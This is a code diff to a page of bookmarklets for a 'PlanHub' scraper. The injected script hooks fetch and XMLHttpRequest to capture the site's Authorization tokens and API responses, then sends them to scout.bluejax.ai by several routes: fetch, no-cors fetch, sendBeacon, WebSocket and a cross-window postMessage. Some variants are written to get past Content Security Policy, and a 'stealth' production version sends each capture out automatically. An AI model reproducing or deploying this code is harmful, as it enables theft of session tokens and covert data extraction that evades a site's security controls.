@@ -222,9 +222,9 @@ tr:hover td{background:rgba(124,58,237,0.05)}
 
 <script>
 // ============================================================
-// SYNC PAGE URL — Update this if deploying to a different URL
+// SYNC PAGE URL
 // ============================================================
-var SYNC_PAGE = (location.origin + location.pathname).replace('index.html','') + 'sync.html';
+var SYNC_PAGE = 'https://bluejaxllc.github.io/planhub-scraper/sync.html';
 var API_URL = 'https://scout.bluejax.ai/api/enrich/push';
 var SUPABASE_URL = 'https://scout.bluejax.ai';  // Redirected from paused Supabase to our own API
 var SUPABASE_KEY = 'not-needed';  // Key not needed for our own API
@@ -241,13 +241,13 @@ var CORE = [
   "window.fetch=function(){var a=arguments,u=typeof a[0]==='string'?a[0]:(a[0]&&a[0].url||''),o=a[1]||{};",
   "if(o.headers){var h=o.headers;if(h.authorization||h.Authorization)window._S.tok=h.authorization||h.Authorization}",
   "return _oF.apply(this,a).then(function(r){",
-  "if(u&&(u.indexOf('ActivityTracker')>-1||u.indexOf('get-filtered')>-1||u.indexOf('get-details')>-1||u.indexOf('/company/')>-1||u.indexOf('projects/search')>-1||u.indexOf('planhub.com/api')>-1)){",
+  "if(u&&(u.indexOf('/api/')>-1||u.indexOf('get-filtered')>-1||u.indexOf('get-details')>-1||u.indexOf('/company/')>-1||u.indexOf('/project')>-1)){",
   "try{var c=r.clone();c.json().then(function(j){window._S.d.push({t:Date.now(),u:u,p:location.href,j:j});window._S.n++;var el=document.getElementById('_sc');if(el)el.textContent=window._S.n}).catch(function(){})}catch(e){}}",
   "return r})};",
   "var _oX=XMLHttpRequest.prototype.open,_oS=XMLHttpRequest.prototype.send;",
   "XMLHttpRequest.prototype.open=function(m,u){this._su=u;return _oX.apply(this,arguments)};",
   "XMLHttpRequest.prototype.send=function(){var x=this;x.addEventListener('load',function(){var u=x._su||'';",
-  "if(u&&(u.indexOf('ActivityTracker')>-1||u.indexOf('get-filtered')>-1||u.indexOf('get-details')>-1||u.indexOf('/company/')>-1||u.indexOf('projects/search')>-1||u.indexOf('planhub.com/api')>-1)){",
+  "if(u&&(u.indexOf('/api/')>-1||u.indexOf('get-filtered')>-1||u.indexOf('get-details')>-1||u.indexOf('/company/')>-1||u.indexOf('/project')>-1)){",
   "try{var j=JSON.parse(x.responseText);window._S.d.push({t:Date.now(),u:u,p:location.href,j:j});window._S.n++;var el=document.getElementById('_sc');if(el)el.textContent=window._S.n}catch(e){}}});",
   "return _oS.apply(this,arguments)};"
 ].join('');
@@ -260,7 +260,7 @@ function UI(btnLabel, onClickCode) {
 }
 
 // ============================================================
-// BOOKMARKLET DEFINITIONS
+// BOOKMARKLETS DEFINITIONS
 // ============================================================
 var BOOKMARKLETS = {};
 
@@ -269,10 +269,10 @@ BOOKMARKLETS.A = "javascript:void(function(){" + CORE +
   UI("🚀 SYNC", "_scoutPopup()") +
   "window._scoutPopup=function(){if(!window._S.d.length){alert('No data captured yet. Browse PlanHub first!');return}" +
   "try{var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d});" +
-  "var b64=btoa(unescape(encodeURIComponent(json)));" +
-  "if(b64.length>50000){var chunks=[];for(var i=0;i<b64.length;i+=45000)chunks.push(b64.slice(i,i+45000));" +
-  "for(var c=0;c<chunks.length;c++){window.open('SYNC_PAGE#chunk='+c+'&total='+chunks.length+'&d='+chunks[c])}}" +
-  "else{window.open('SYNC_PAGE#d='+b64)}" +
+  "var w=window.open('SYNC_PAGE');" +
+  "var l=function(e){if(e.data==='SYNC_READY'){w.postMessage({type:'SCOUT_DATA',payload:json},'*');window.removeEventListener('message',l);}};" +
+  "window.addEventListener('message',l);" +
+  "setTimeout(function(){w.postMessage({type:'SCOUT_DATA',payload:json},'*');},2500);" +
   "document.getElementById('_syncbtn').textContent='✅ SENT'}catch(e){alert('Popup err: '+e.message)}};" +
   "}())".replace(/SYNC_PAGE/g, SYNC_PAGE);
 
@@ -322,11 +322,11 @@ BOOKMARKLETS.E = "javascript:void(function(){" + CORE +
   "var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d});" +
   "var btn=document.getElementById('_syncbtn');btn.textContent='⏳...';" +
   // Try normal fetch first
-  "fetch('"+API_URL+"',{method:'POST',headers:{'content-type':'application/json'},body:json})" +
+  "fetch('"+SUPABASE_URL+"/api/scout/inbox',{method:'POST',headers:{'content-type':'application/json'},body:json})" +
   ".then(function(r){btn.textContent=r.ok?'✅ '+r.status:'❌ '+r.status;alert('Fetch result: '+r.status)})" +
   ".catch(function(e){" +
   // Fallback: try no-cors mode
-  "fetch('"+API_URL+"',{method:'POST',mode:'no-cors',headers:{'content-type':'text/plain'},body:json})" +
+  "fetch('"+SUPABASE_URL+"/api/scout/inbox',{method:'POST',mode:'no-cors',headers:{'content-type':'text/plain'},body:json})" +
   ".then(function(){btn.textContent='⚠️ no-cors';alert('Sent in no-cors mode. Check server.')})" +
   ".catch(function(e2){btn.textContent='❌ BLOCKED';alert('Both fetch modes blocked by CSP.\\n'+e.message)})" +
   "})};" +
@@ -338,7 +338,7 @@ BOOKMARKLETS.F = "javascript:void(function(){" + CORE +
   "window._scoutBeacon=function(){if(!window._S.d.length){alert('No data captured yet.');return}" +
   "var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d});" +
   "var blob=new Blob([json],{type:'application/json'});" +
-  "try{var ok=navigator.sendBeacon('"+API_URL+"',blob);" +
+  "try{var ok=navigator.sendBeacon('"+SUPABASE_URL+"/api/scout/inbox',blob);" +
   "document.getElementById('_syncbtn').textContent=ok?'✅ SENT':'❌ FAIL';" +
   "alert('sendBeacon returned: '+(ok?'SUCCESS — data queued for delivery':'FAILED — CSP blocked'))}catch(e){" +
   "document.getElementById('_syncbtn').textContent='❌ ERR';alert('sendBeacon error: '+e.message)}};" +
@@ -346,14 +346,14 @@ BOOKMARKLETS.F = "javascript:void(function(){" + CORE +
 
 // --- G: WEBSOCKET ---
 BOOKMARKLETS.G = "javascript:void(function(){" + CORE +
-  UI("\ud83d\udd0c WS", "_scoutWS()") +
+  UI("🔌 WS", "_scoutWS()") +
   "window._scoutWS=function(){if(!window._S.d.length){alert('No data captured yet.');return}" +
   "var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d});" +
-  "var btn=document.getElementById('_syncbtn');btn.textContent='\u23f3...';" +
+  "var btn=document.getElementById('_syncbtn');btn.textContent='⏳...';" +
   "try{var ws=new WebSocket('wss://scout.bluejax.ai/ws');" +
-  "ws.onopen=function(){ws.send(json);btn.textContent='\u2705 SENT';alert('WebSocket: Data sent!');ws.close()};" +
-  "ws.onerror=function(){btn.textContent='\u274c FAIL';alert('WebSocket blocked.')};" +
-  "ws.onclose=function(){}}catch(e){btn.textContent='\u274c ERR';alert('WS error: '+e.message)}};" +
+  "ws.onopen=function(){ws.send(json);btn.textContent='✅ SENT';alert('WebSocket: Data sent!');ws.close()};" +
+  "ws.onerror=function(){btn.textContent='❌ FAIL';alert('WebSocket blocked.')};" +
+  "ws.onclose=function(){}}catch(e){btn.textContent='❌ ERR';alert('WS error: '+e.message)}};" +
   "}())";
 
 // --- S: STEALTH BEACON v11 (PRODUCTION) ---
@@ -362,20 +362,19 @@ BOOKMARKLETS.S = "javascript:void(function(){" + CORE +
   "window._S.d.push=function(item){_origPush(item);" +
   "try{var p=JSON.stringify({source:'stealth_v11',ts:Date.now(),page:location.href,data:item});" +
   "var b=new Blob([p],{type:'application/json'});" +
-  "navigator.sendBeacon('" + API_URL + "',b);" +
-  "var sp=JSON.stringify({payload:p,source:'stealth_v11_auto',created_at:new Date().toISOString()});" +
-  "navigator.sendBeacon('" + SUPABASE_URL + "/api/scout/inbox?_legacy=" + SUPABASE_KEY + "',new Blob([sp],{type:'application/json'}));" +
+  "var pb=new Blob([JSON.stringify({payload:p,source:'stealth_v11_auto',created_at:new Date().toISOString()})],{type:'application/json'});" +
+  "navigator.sendBeacon('" + SUPABASE_URL + "/api/scout/inbox',pb);" +
   "}catch(e){};return window._S.d.length};" +
-  UI("\ud83d\udce4 DUMP", "_scoutDump()") +
+  UI("📥 DUMP", "_scoutDump()") +
   "window._scoutDump=function(){if(!window._S.d.length){alert('No data yet. Browse PlanHub first!');return}" +
   "try{var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d,source:'stealth_v11_dump'});" +
-  "var b64=btoa(unescape(encodeURIComponent(json)));" +
-  "navigator.sendBeacon('" + API_URL + "',new Blob([json],{type:'application/json'}));" +
-  "if(b64.length>50000){var ch=[];for(var i=0;i<b64.length;i+=45000)ch.push(b64.slice(i,i+45000));" +
-  "for(var c=0;c<ch.length;c++){window.open('SYNC_PAGE#chunk='+c+'&total='+ch.length+'&d='+ch[c])}}" +
-  "else{window.open('SYNC_PAGE#d='+b64)}" +
-  "document.getElementById('_syncbtn').textContent='\u2705 SENT '+window._S.d.length;" +
-  "alert('Sent '+window._S.d.length+' captures!')}catch(e){alert('Err: '+e.message)}};" +
+  "navigator.sendBeacon('" + SUPABASE_URL + "/api/scout/inbox',new Blob([json],{type:'application/json'}));" +
+  "var w=window.open('SYNC_PAGE');" +
+  "var l=function(e){if(e.data==='SYNC_READY'){w.postMessage({type:'SCOUT_DATA',payload:json},'*');window.removeEventListener('message',l);}};" +
+  "window.addEventListener('message',l);" +
+  "setTimeout(function(){w.postMessage({type:'SCOUT_DATA',payload:json},'*');},2500);" +
+  "document.getElementById('_syncbtn').textContent='✅ SENT '+window._S.d.length;" +
+  "}catch(e){alert('Use Copy/Paste or Save (data was too large for URL payload)\\n'+e.message)}};" +
   "}())".replace(/SYNC_PAGE/g, SYNC_PAGE);
 
 // --- H: MEGA (ALL METHODS) ---
